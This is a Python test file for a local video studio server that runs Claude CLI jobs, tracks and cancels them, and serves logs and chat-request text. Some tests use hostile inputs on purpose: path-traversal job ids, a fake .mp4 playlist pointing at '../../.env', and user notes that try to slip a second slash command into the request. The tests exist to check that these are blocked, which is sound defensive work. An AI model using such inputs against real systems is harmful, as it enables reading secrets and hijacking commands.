        # A live PID (this test process) whose creation time does not match the record.
        job = self.write_record(pid=os.getpid(), created=1000.0)
        with patch.object(runner, '_kill_tree') as kill:
            runner.cancel(job)
            self.assertEqual(runner.status(job)['state'], 'stopped')
        kill.assert_not_called()
        self.assertEqual(self.saved_state(job), 'stopped')

    def test_patched_creation_time_mismatch_is_stopped(self):
        job = self.write_record(pid=os.getpid(), created=5000.0)
        with patch.object(runner, '_proc_created', return_value=5003.5), patch.object(runner, '_kill_tree') as kill:
            self.assertEqual(runner.status(job)['state'], 'stopped')
            runner.cancel(job)
        kill.assert_not_called()

    def test_record_without_creation_time_is_stopped(self):
        job = self.write_record(pid=os.getpid())
        with patch.object(runner, '_kill_tree') as kill:
            self.assertEqual(runner.status(job)['state'], 'stopped')
            runner.cancel(job)
        kill.assert_not_called()

    def test_verified_orphan_stays_running_and_cancel_kills_it(self):
        created = runner._proc_created(os.getpid())
        self.assertIsNotNone(created)
        job = self.write_record(pid=os.getpid(), created=created + 1)  # within the 2 s tolerance
        with patch.object(runner, '_kill_tree') as kill:
            self.assertEqual(runner.status(job)['state'], 'running')
            with self.assertRaises(runner.RunnerError):
                runner.start('reel-one', 'edit')
            runner.cancel(job)
        kill.assert_called_once_with(os.getpid())
        self.assertEqual(runner.status(job)['state'], 'stopped')

    def test_spawn_records_creation_time(self):
        job = runner.start('reel-one', 'edit')['job']
        self.finish(job)
        record = json.loads((self.root / 'logs' / 'jobs.json').read_text(encoding='utf-8'))['jobs'][job]
        self.assertIsInstance(record['created'], float)
        self.assertLess(abs(record['created'] - record['started']), 5)

    def test_classifies_from_result_event_not_assistant_text(self):
        self.fake(exit=1, output='\n'.join([
            '{"type":"assistant","message":{"content":[{"type":"text","text":"Checking the rate limit docs and usage limit notes"}]}}',
            '{"type":"result","subtype":"error_during_execution","is_error":true,"result":"Tool crashed"}']))
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.failed'))

    def test_classification_falls_back_to_full_tail(self):
        self.fake(exit=1, output='{"type":"system","note":"Claude AI usage limit reached"}')
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual(result['message_key'], 'claude.limit')

    def test_corrupt_jobs_file_is_quarantined(self):
        logs = self.root / 'logs'
        logs.mkdir(exist_ok=True)
        (logs / 'jobs.json').write_text('{broken', encoding='utf-8')
        with self.assertRaises(runner.RunnerError) as caught:
            runner.status('a' * 32)
        self.assertEqual(caught.exception.status, 404)
        self.assertEqual(len(list(logs.glob('jobs.corrupt-*.json'))), 1)
        self.assertEqual(self.finish(runner.start('reel-one', 'edit')['job'])['state'], 'done')

    def test_unknown_or_missing_kind_is_409(self):
        for project in ('odd-one', 'bare-one'):
            with self.subTest(project=project):
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.start(project, 'edit')
                self.assertEqual((caught.exception.status, caught.exception.message_key), (409, 'claude.unknown-kind'))

    def test_hebrew_output_is_logged_as_utf8(self):
        self.fake(output='\u05e9\u05d2\u05d9\u05d0\u05d4 \u05d1\u05e2\u05e8\u05d9\u05db\u05d4', exit=1)
        job = runner.start('reel-one', 'edit')['job']
        result = self.finish(job)
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.failed'))
        log = (self.root / 'logs' / f'claude-{job}.log').read_text(encoding='utf-8')
        self.assertIn('\u05e9\u05d2\u05d9\u05d0\u05d4 \u05d1\u05e2\u05e8\u05d9\u05db\u05d4', log)

    def test_start_during_cancel_is_busy(self):
        self.fake(sleep=60)
        job = runner.start('reel-one', 'edit')['job']
        gate = threading.Event()
        real_kill = runner._kill_tree

        def slow_kill(pid):
            gate.wait(20)
            real_kill(pid)

        with patch.object(runner, '_kill_tree', side_effect=slow_kill):
            canceller = threading.Thread(target=runner.cancel, args=(job,))
            canceller.start()
            deadline = time.monotonic() + 10
            while self.saved_state(job) != 'stopping' and time.monotonic() < deadline:
                time.sleep(0.02)
            self.assertEqual(self.saved_state(job), 'stopping')
            outcome = []

            def second_start():
                try:
                    outcome.append(runner.start('reel-one', 'edit'))
                except runner.RunnerError as error:
                    outcome.append(error.message_key)

            starter = threading.Thread(target=second_start)
            starter.start()
            starter.join(20)
            self.assertEqual(outcome, ['busy'])
            gate.set()
            canceller.join(30)
        self.assertEqual(runner.status(job)['state'], 'stopped')
        self.fake(sleep=0)
        self.assertEqual(self.finish(runner.start('reel-one', 'edit')['job'])['state'], 'done')

    def test_rejects_unknown_project_reference_task_and_job(self):
        cases = [(('nope', 'edit'), 404), (('../x', 'edit'), 404), (('reel-one', 'publish'), 400),
                 ((None, 'learn-style', 'missing-ref'), 404), ((None, 'learn-style', None), 404),
                 (('missing', 'learn-style', 'ref-one'), 404)]
        for args, status in cases:
            with self.subTest(args=args):
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.start(*args)
                self.assertEqual(caught.exception.status, status)
        for job in ('nope', 'b' * 32):
            with self.subTest(job=job):
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.status(job)
                self.assertEqual(caught.exception.status, 404)
        self.assertFalse((self.root / 'logs' / 'jobs.json').exists())


    # --- Task 15: latest job per project, status timing, support log tail ---

    def test_status_reports_job_and_start_time(self):
        before = time.time()
        job = runner.start('reel-one', 'edit')['job']
        result = self.finish(job)
        self.assertEqual(result['job'], job)
        self.assertGreaterEqual(result['started'], before - 1)

    def test_latest_job_for_a_project(self):
        self.assertEqual(runner.latest('reel-one'), {'job': None})
        self.fake(sleep=60)
        job = runner.start('reel-one', 'edit')['job']
        other = runner.start('quiet-one', 'edit')['job']
        result = runner.latest('reel-one')
        self.assertEqual((result['job'], result['state']), (job, 'running'))
        self.assertEqual(runner.latest('quiet-one')['job'], other)

    def test_latest_job_picks_the_newest_record(self):
        logs = self.root / 'logs'
        logs.mkdir(exist_ok=True)
        old, new = 'a' * 32, 'b' * 32
        base = {'task': 'edit', 'project': 'reel-one', 'reference': None, 'target': 'projects/reel-one',
                'message_key': None, 'exit_code': 0}
        (logs / 'jobs.json').write_text(json.dumps({'jobs': {
            new: {**base, 'job': new, 'state': 'failed', 'message_key': 'claude.limit', 'started': time.time() - 10},
            old: {**base, 'job': old, 'state': 'done', 'started': time.time() - 500},
        }}), encoding='utf-8')
        result = runner.latest('reel-one')
        self.assertEqual((result['job'], result['state'], result['message_key']), (new, 'failed', 'claude.limit'))

    def test_latest_job_for_a_reference(self):
        job = runner.start(None, 'learn-style', 'ref-one')['job']
        self.finish(job)
        self.assertEqual(runner.latest(ref_id='ref-one')['job'], job)
        self.assertEqual(runner.latest('reel-one'), {'job': None})

    def test_latest_rejects_unknown_or_ambiguous_targets(self):
        for args, kwargs, status, key in [
            (('nope',), {}, 404, 'claude.unknown-project'),
            (('../reel-one',), {}, 404, 'claude.unknown-project'),
            ((), {'ref_id': 'nope'}, 404, 'claude.unknown-reference'),
            ((), {}, 400, 'claude.invalid-request'),
            (('reel-one',), {'ref_id': 'ref-one'}, 400, 'claude.invalid-request'),
        ]:
            with self.subTest(args=args, kwargs=kwargs):
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.latest(*args, **kwargs)
                self.assertEqual((caught.exception.status, caught.exception.message_key), (status, key))

    def test_log_tail_returns_the_last_lines(self):
        job = self.write_record(state='failed', message_key='claude.failed')
        lines = [f'line {n} · שורה' for n in range(1, 101)]
        (self.root / 'logs' / f'claude-{job}.log').write_bytes(('\n'.join(lines) + '\n').encode('utf-8'))
        self.assertEqual(runner.log_tail(job, 40), '\n'.join(lines[-40:]))
        self.assertEqual(runner.log_tail(job, 3), '\n'.join(lines[-3:]))

    def test_log_tail_clips_long_lines(self):
        job = self.write_record(state='failed')
        (self.root / 'logs' / f'claude-{job}.log').write_text('x' * 2000 + '\nshort\n', encoding='utf-8')
        first, second = runner.log_tail(job, 40).split('\n')
        self.assertEqual(len(first), 501)
        self.assertTrue(first.endswith('…'))
        self.assertEqual(second, 'short')

    def test_log_tail_of_a_job_without_log_is_empty(self):
        job = self.write_record(state='failed')
        self.assertEqual(runner.log_tail(job, 40), '')

    def test_log_tail_rejects_bad_jobs_and_counts(self):
        job = self.write_record(state='failed')
        for bad_job, lines, status in [('b' * 32, 40, 404), ('../jobs', 40, 404), (job, 0, 400), (job, 201, 400),
                                       (job, '40', 400), (job, True, 400)]:
            with self.subTest(job=bad_job, lines=lines):
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.log_tail(bad_job, lines)
                self.assertEqual(caught.exception.status, status)


@unittest.skipUnless(shutil.which('ffmpeg') and shutil.which('ffprobe'), 'ffmpeg not installed')
class LearnStyleJobTest(RunnerBase):
    """RULING R53: learn-style = the server's analysis, then a Claude run with no shell at all."""

    def setUp(self):
        super().setUp()
        self.ref = self.root / 'references' / 'ref-one'
        subprocess.run([shutil.which('ffmpeg'), '-v', 'error', '-f', 'lavfi', '-i',
                        'testsrc2=size=320x568:rate=10:duration=3', '-c:v', 'libx264', '-pix_fmt', 'yuv420p',
                        str(self.ref / 'source.mp4')], check=True, timeout=60)
        self.card = self.root / 'card.md'
        fields = {key: 'one plain line' for key in looks.REQUIRED_KEYS}
        fields.update(id='ref-one', name_he='סגנון', name_en='Style')
        self.card.write_text('---\n' + ''.join(f'{k}: {v}\n' for k, v in fields.items()) + '---\nnotes\n',
                             encoding='utf-8')

    def run_learn(self, **fake):
        record = self.root / 'record.json'
        self.fake(record=record, **fake)
        result = self.finish(runner.start(None, 'learn-style', 'ref-one')['job'], timeout=120)
        return result, (json.loads(record.read_text(encoding='utf-8')) if record.exists() else None)

    def test_the_claude_run_has_no_shell_and_writes_only_the_card(self):
        result, seen = self.run_learn(card=self.card)
        self.assertEqual(result['state'], 'done', result)
        self.assertEqual(seen['argv'], [
            '-p', "Follow analysis/r01/instructions.md to write this reference's style card. Reply in Hebrew.",
            '--output-format', 'stream-json', '--verbose', '--permission-mode', 'dontAsk', '--strict-mcp-config',
            '--setting-sources', 'project', '--settings', SETTINGS, '--tools', 'Read,Glob,Grep,Write',
            '--disallowedTools', *COMMON_DENY, 'Edit(./style-card.json)', 'Bash',
            '--allowedTools', 'Read(./**)', 'Edit(./style-card.md)'])
        self.assertFalse([a for a in seen['argv'] if a.startswith('Bash(')])
        self.assertEqual(Path(seen['cwd']).resolve(), self.ref.resolve())  # reads outside it are denied
        self.assertEqual(Path(seen['session_env']['STUDIO_JOB_DIR']), self.ref.resolve())
        self.assertEqual([(s['key'], s['state']) for s in result['steps']],
                         [('watch', 'done'), ('analyze', 'done'), ('card', 'done')])

    def test_the_server_analysis_writes_the_files_the_skill_used_to_make(self):
        self.run_learn(card=self.card)
        round_folder = self.ref / 'analysis' / 'r01'
        for name in ('notes.md', 'analysis.json', 'hook.jpg', 'sheet-01.jpg', 'card-example.md', 'instructions.md'):
            self.assertTrue((round_folder / name).is_file(), name)
        analysis = json.loads((round_folder / 'analysis.json').read_text(encoding='utf-8'))
        self.assertEqual(analysis['measured']['shots'], len(analysis['cuts']) + 1)
        self.assertAlmostEqual(analysis['measured']['duration'], 3.0, delta=0.2)
        self.assertIn('no sound track', analysis['words_note'])
        self.assertIn('no shell', (round_folder / 'instructions.md').read_text(encoding='utf-8'))
        self.run_learn(card=self.card)
        self.assertTrue((self.ref / 'analysis' / 'r02' / 'analysis.json').is_file())  # a new round each time

    def test_a_card_that_fails_the_check_fails_the_run(self):
        self.card.write_text('---\nid: ref-one\n---\n', encoding='utf-8')
        result, _ = self.run_learn(card=self.card)
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.card-invalid'))
        self.assertEqual(result['steps'][-1]['state'], 'todo')

    def test_without_a_video_claude_never_starts(self):
        (self.ref / 'source.mp4').unlink()
        result, seen = self.run_learn(card=self.card)
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.no-source'))
        self.assertIsNone(seen)

    def test_a_playlist_named_mp4_is_not_followed(self):
        # The source is someone else's file: a playlist renamed .mp4 must not pull in other files.
        (self.ref / 'source.mp4').write_text('#EXTM3U\n#EXTINF:1,\n../../.env\n', encoding='utf-8')
        result, seen = self.run_learn(card=self.card)
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.unreadable-source'))
        self.assertIsNone(seen)


class ClaudeRequestTextTest(RunnerBase):
    """Task 15: the "copy to chat" fallback text (project_index.starter_request_text)."""

    def setUp(self):
        super().setUp()
        root = self.root / 'projects' / 'reel-one'
        (root / 'choices.json').write_text(json.dumps({
            'cut': 'tight', 'look': 'soft', 'sound': 'music-calm', 'sfx': True, 'captions': True,
            'length': '30-60', 'extra': 'more energy at the start', 'presenter': 'popout'}), encoding='utf-8')
        (root / 'brief.md').write_text('# brief\n', encoding='utf-8')
        (root / 'materials.json').write_text(json.dumps({'items': [
            {'id': 'abc', 'file': 'materials/raw/take-1.mp4', 'tag': 'raw', 'note': 'the good take', 'owned': True},
            {'id': 'def', 'file': 'materials/audio/song.mp3', 'tag': 'music', 'note': '', 'owned': False},
        ]}), encoding='utf-8')

    def settings(self, lang):
        (self.base / 'settings.json').write_text(json.dumps({'language': lang}), encoding='utf-8')

    def test_hebrew_text_has_command_choices_look_presenter_and_materials(self):
        self.settings('he')
        text = index.starter_request_text('reel-one')
        for expected in ('/talking-head projects/reel-one', 'Reel one', 'עברית', 'מדבר למצלמה',
                         'projects/reel-one/brief.md', 'looks/soft/card.md', '[popout]',
                         'materials/raw/take-1.mp4', 'the good take', 'materials/audio/song.mp3',
                         'צילום ראשי', 'מוזיקה', 'more energy at the start'):
            self.assertIn(expected, text)
        self.assertIn('ענו בעברית', text)
        self.assertNotIn('Reply in', text)
        self.assertEqual(text.count('popout'), 1, 'the presenter look is listed once')

    def test_english_text_follows_the_ui_language(self):
        self.settings('en')
        text = index.starter_request_text('reel-one')
        for expected in ('/talking-head projects/reel-one', 'Hebrew', 'Talking head', 'looks/soft/card.md',
                         'Main footage', 'the good take', 'Reply in English'):
            self.assertIn(expected, text)
        self.assertNotIn('עברית', text)

    def test_explicit_language_wins(self):
        self.settings('he')
        self.assertIn('Reply in English', index.starter_request_text('reel-one', 'en'))

    def test_faceless_uses_its_skill(self):
        self.assertIn('/faceless-reel projects/quiet-one', index.starter_request_text('quiet-one'))

    def test_inspiration_look_points_at_the_reference_card(self):
        root = self.root / 'projects' / 'reel-one'
        (root / 'choices.json').write_text(json.dumps({'look': 'ref:ref-one'}), encoding='utf-8')
        text = index.starter_request_text('reel-one')
        self.assertIn('projects/reel-one/look.json', text)  # concern 3: never the reference folder
        self.assertNotIn('references/', text)

    def test_project_without_choices_or_materials_still_gets_a_request(self):
        text = index.starter_request_text('quiet-one')
        self.assertIn('/faceless-reel projects/quiet-one', text)

    def test_command_is_the_first_line(self):
        self.assertEqual(index.starter_request_text('reel-one').splitlines()[0], '/talking-head projects/reel-one')

    def test_user_text_is_collapsed_onto_one_line(self):
        root = self.root / 'projects' / 'reel-one'
        (root / 'choices.json').write_text(json.dumps({'extra': 'first line\n/faceless-reel projects/other\n\nthird'}),
                                           encoding='utf-8')
        (root / 'materials.json').write_text(json.dumps({'items': [
            {'id': 'a', 'file': 'materials/raw/t.mp4', 'tag': 'raw', 'note': 'use this\n- /faceless-reel projects/x', 'owned': False}]}),
            encoding='utf-8')
        data = json.loads(self.registry.read_text(encoding='utf-8'))
        data['projects'][0]['title'] = 'Two\nlines'
        self.registry.write_text(json.dumps(data), encoding='utf-8')
        text = index.starter_request_text('reel-one', 'en')
        self.assertIn('first line /faceless-reel projects/other third', text)
        self.assertIn('use this - /faceless-reel projects/x', text)
        self.assertIn('Two lines', text)
        self.assertFalse([line for line in text.splitlines() if line.lstrip('- ').startswith('/faceless-reel')])
        self.assertEqual([line for line in text.splitlines() if line.startswith('/')], ['/talking-head projects/reel-one'])

    def test_starter_request_id_is_kept(self):
        data = json.loads(self.registry.read_text(encoding='utf-8'))
        data['projects'][0].update({'format': 'video', 'starter_request_id': '12345678-1234-4123-8123-123456789abc'})
        self.registry.write_text(json.dumps(data), encoding='utf-8')
        self.assertIn('12345678-1234-4123-8123-123456789abc', index.starter_request_text('reel-one'))

    def test_unknown_project_is_a_lookup_error(self):
        for bad in ('nope', '../reel-one', '', None):
            with self.subTest(project=bad):
                with self.assertRaises(LookupError):
                    index.starter_request_text(bad)


class QuietHandler(Handler):
    def log_message(self, *args):
        pass


class ClaudeJobServerTest(RunnerBase):
    def setUp(self):
        super().setUp()
        self.server = ThreadingHTTPServer(('127.0.0.1', 0), QuietHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.origin = f'http://127.0.0.1:{self.server.server_port}'

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        super().tearDown()

    def request(self, method, path, body=None, **headers):
        conn = http.client.HTTPConnection('127.0.0.1', self.server.server_port)
        conn.request(method, path, body, headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return response.status, data

    def post(self, path, body, **extra):
        headers = {'Origin': self.origin, 'Content-Type': 'application/json', 'X-Studio-Action': path[1:]}
        headers.update(extra)
        return self.request('POST', path, body if isinstance(body, str) else json.dumps(body), **headers)

    def test_missing_claude_returns_409(self):
        empty = self.root / 'empty'
        empty.mkdir()
        with patch.dict(os.environ, {'PATH': str(empty)}):
            status, data = self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'})
        self.assertEqual((status, json.loads(data)), (409, {'error': 'claude-missing'}))

    def test_start_poll_and_cancel(self):
        self.fake(sleep=60)
        status, data = self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'})
        self.assertEqual(status, 202)
        job = json.loads(data)['job']
        status, data = self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'})
        self.assertEqual((status, json.loads(data)), (409, {'error': 'busy', 'job': job}))
        status, data = self.request('GET', '/claude-job?id=' + job)
        self.assertEqual((status, json.loads(data)['state']), (200, 'running'))
        status, data = self.post('/claude-job-cancel', {'job': job})
        self.assertEqual((status, json.loads(data)['state']), (200, 'stopped'))
        self.assertEqual(self.finish(job)['state'], 'stopped')

    def test_learn_style_request(self):
        # No video file for this reference yet: the studio's own analysis says so (R53).
        status, data = self.post('/claude-job', {'task': 'learn-style', 'reference': 'ref-one'})
        self.assertEqual(status, 202)
        result = self.finish(json.loads(data)['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.no-source'))

    def test_rejects_bad_requests(self):
        cases = [
            (self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'}, **{'X-Studio-Action': 'new-video'}), 403),
            (self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'}, Origin='https://example.invalid'), 403),
            (self.post('/claude-job', '{not json'), 400),
            (self.post('/claude-job', ['reel-one']), 400),
            (self.post('/claude-job', {'project': 'reel-one', 'task': 'edit', 'extra': 1}), 400),
            (self.post('/claude-job', {'project': 'nope', 'task': 'edit'}), 404),
            (self.post('/claude-job-cancel', {'job': 'b' * 32}), 404),
            (self.post('/claude-job-cancel', {'job': 'b' * 32, 'more': 1}), 400),
            (self.request('GET', '/claude-job?id=' + 'b' * 32), 404),
            (self.request('GET', '/claude-job'), 400),
        ]
        for (status, _), expected in cases:
            self.assertEqual(status, expected)
        self.assertFalse((self.root / 'logs' / 'jobs.json').exists())


    # --- Task 15 routes ---

    def test_latest_job_route(self):
        status, data = self.request('GET', '/claude-job?project=reel-one')
        self.assertEqual((status, json.loads(data)), (200, {'job': None}))
        self.fake(sleep=60)
        job = json.loads(self.post('/claude-job', {'project': 'reel-one', 'task': 'edit'})[1])['job']
        status, data = self.request('GET', '/claude-job?project=reel-one')
        result = json.loads(data)
        self.assertEqual((status, result['job'], result['state']), (200, job, 'running'))
        status, data = self.request('GET', '/claude-job?reference=ref-one')
        self.assertEqual((status, json.loads(data)), (200, {'job': None}))

    def test_latest_job_route_rejects_bad_queries(self):
        for path, expected in [('/claude-job?project=nope', 404), ('/claude-job?project=reel-one&project=quiet-one', 400),
                               ('/claude-job?project=reel-one&id=' + 'a' * 32, 400), ('/claude-job?other=1', 400),
                               ('/claude-job?reference=nope', 404)]:
            with self.subTest(path=path):
                self.assertEqual(self.request('GET', path)[0], expected)

    def test_job_log_route(self):
        job = self.write_record(state='failed', message_key='claude.failed')
        lines = [f'event {n}' for n in range(1, 61)]
        (self.root / 'logs' / f'claude-{job}.log').write_text('\n'.join(lines) + '\n', encoding='utf-8')
        status, data = self.request('GET', f'/claude-job-log?id={job}&lines=40')
        self.assertEqual((status, json.loads(data)), (200, {'log': '\n'.join(lines[-40:])}))
        status, data = self.request('GET', f'/claude-job-log?id={job}')
        self.assertEqual(json.loads(data)['log'], '\n'.join(lines[-40:]))

    def test_job_log_route_is_confined(self):
        job = self.write_record(state='failed')
        for path, expected in [(f'/claude-job-log?id={"b" * 32}', 404), ('/claude-job-log?id=..%2Fjobs', 404),
                               (f'/claude-job-log?id={job}&lines=-1', 400), (f'/claude-job-log?id={job}&lines=999', 400),
                               (f'/claude-job-log?id={job}&lines=4x', 400), ('/claude-job-log', 400),
                               (f'/claude-job-log?id={job}&id={job}', 400), (f'/claude-job-log?id={job}&file=jobs.json', 400)]:
            with self.subTest(path=path):
                self.assertEqual(self.request('GET', path)[0], expected)
        status, _ = self.request('GET', f'/claude-job-log?id={job}', **{'Sec-Fetch-Site': 'cross-site'})
        self.assertEqual(status, 403)
        status, _ = self.request('GET', f'/claude-job-log?id={job}', Origin='https://example.invalid')
        self.assertEqual(status, 403)

    def test_copy_request_route(self):
        root = self.root / 'projects' / 'reel-one'
        (root / 'choices.json').write_text(json.dumps({'cut': 'tight'}), encoding='utf-8')
        status, data = self.request('GET', '/claude-request?project=reel-one')
        self.assertEqual(status, 200)
        self.assertIn('/talking-head projects/reel-one', json.loads(data)['text'])
        for path, expected in [('/claude-request?project=nope', 404), ('/claude-request', 400),
                               ('/claude-request?project=reel-one&x=1', 400)]:
            with self.subTest(path=path):
                self.assertEqual(self.request('GET', path)[0], expected)

if __name__ == '__main__':
    unittest.main()
